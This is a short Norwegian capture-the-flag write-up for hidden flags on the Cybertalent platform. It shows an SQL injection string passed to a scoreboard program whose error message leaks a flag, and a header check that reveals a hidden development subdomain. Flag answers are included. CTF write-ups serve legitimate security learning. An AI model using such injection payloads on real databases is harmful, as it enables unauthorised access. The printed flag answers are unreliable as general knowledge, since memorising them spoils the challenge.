# Skjulte flagg
>Det finnes 6 skjulte flagg på plattformen.\
>Hvert flagg gir 1 poeng og er skjult på ulike steder i plattformen og i komponentene corax interagerer med.

---

# 4.2 Scoreboard SQL injeksjon
```sh
login@corax ~ $ /usr/bin/scoreboard "' UNION SELECT 1--"
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' OR flags.flag = '9031a00ea982fd7e10bfc17a5a7ee1d6'' at line 1
```

login@corax ~ $ scoreboard 9031a00ea982fd7e10bfc17a5a7ee1d6

4.2.1 Scoreboard SQL injeksjon\
Hvem vet, plutselig hadde det fungert!

---

# 4.4 CSP policy
```sh
login@corax ~ $ curl -v https://ctf.cybertalent.no/ 2>&1 | grep -i "^<"
< HTTP/2 200
< date: Tue, 30 Dec 2025 13:35:10 GMT
< server: uvicorn
< content-security-policy: default-src 'none'; style-src ctf.cybertalent.no 370b150807027152d48779c80c53bead-ctf.cybertalent.no; font-src ctf.cybertalent.no 370b150807027152d48779c80c53bead-ctf.cybertalent.no; img-src ctf.cybertalent.no 370b150807027152d48779c80c53bead-ctf.cybertalent.no;
< content-length: 7702
< content-type: text/html; charset=utf-8
```

login@corax ~ $ scoreboard 370b150807027152d48779c80c53bead

4.4.1 CSP Policy\
Du finner digitale spor over alt! Dette er siden vi brukte under utvikling av plattformen.